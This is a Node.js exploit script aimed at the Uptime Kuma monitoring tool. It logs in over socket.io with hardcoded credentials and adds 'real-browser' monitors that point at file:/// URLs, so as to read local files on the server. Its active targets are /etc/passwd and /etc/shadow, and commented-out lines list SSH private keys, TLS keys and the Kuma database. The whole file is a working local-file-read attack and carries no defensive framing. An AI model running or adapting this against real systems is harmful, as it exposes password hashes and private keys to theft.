const { io } = require("socket.io-client");

let masterip = process.argv[3];

// Server configuration and credentials
const CONFIG = {

  serverUrl: "ws://" + masterip + ":32711",
  credentials: {
    username: "k8s",
    password: "Kubernetes1"
  },
  requestType: {
    REAL_BROWSER: "real-browser",
    HTTP: "http"
  },
  urlHeader: {
    VIEW_SOURCE: "view-source:file:///",
    FILE: "file:///"
  }
};

// List of sensitive files on a Linux system
const SENSITIVE_FILES = [
  "/etc/passwd",
  "/etc/shadow",
  "/etc/hosts",
  "/etc/hostname",
  // "/etc/network/interfaces", // May vary depending on the distribution
  // "/etc/ssh/ssh_config",
  // "/etc/ssh/sshd_config",
  // "~/.ssh/authorized_keys",
  // "~/.ssh/id_rsa",
  // "/etc/ssl/private/*.key",
  // "/etc/ssl/certs/*.crt",
  // "/app/data/kuma.db", // Uptime Kuma database file
  // "/app/data/config.json" // Uptime Kuma configuration file
];

// Function to send a request and wait for the response
function sendRequest(socket, filePath, type) {
  return new Promise((resolve, reject) => {
    fileUrl = CONFIG.urlHeader.VIEW_SOURCE + filePath;
    if (type == CONFIG.requestType.HTTP) {
      fileUrl = CONFIG.urlHeader.FILE + filePath;
    }
    socket.emit("add", {
      type: type,
      name: type + " " + filePath,
      url: fileUrl,
      method: "GET",
      maxretries: 0,
      timeout: 500,
      notificationIDList: {},
      ignoreTls: true,
      upsideDown: false,
      accepted_statuscodes: ["200-299"]
    }, (res) => {
      console.log(`Response for file ${filePath}:`, res);
      resolve();
    });
  });
}

// Main function for connecting and sending the 'add' request
(async () => {
  const socket = io(CONFIG.serverUrl);

  // Handle connection errors
  socket.on("connect_error", (err) => {
    console.error("Connection failed:", err.message);
  });

  try {
    // Connecting with credentials
    await new Promise((resolve, reject) => {
      socket.emit("login", {
        username: CONFIG.credentials.username,
        password: CONFIG.credentials.password,
        token: ""
      }, (res) => {
        if (res.ok) {
          console.log("Connection successful");
          resolve();
        } else {
          console.log(res);
          reject(new Error("Connection failed"));
        }
      });
    });

    // Sending requests for each file using Promise.all to ensure synchronization
    const realBrowserRequests = SENSITIVE_FILES.map(filePath => sendRequest(socket, filePath, CONFIG.requestType.REAL_BROWSER));

    // Wait for all requests to be sent
    await Promise.all([...realBrowserRequests]);

    // Close the socket after all requests have been sent
    socket.close();
    console.log("Connection closed after all requests.");

  } catch (error) {
    console.error("Error:", error.message);
    socket.close();
  }
})();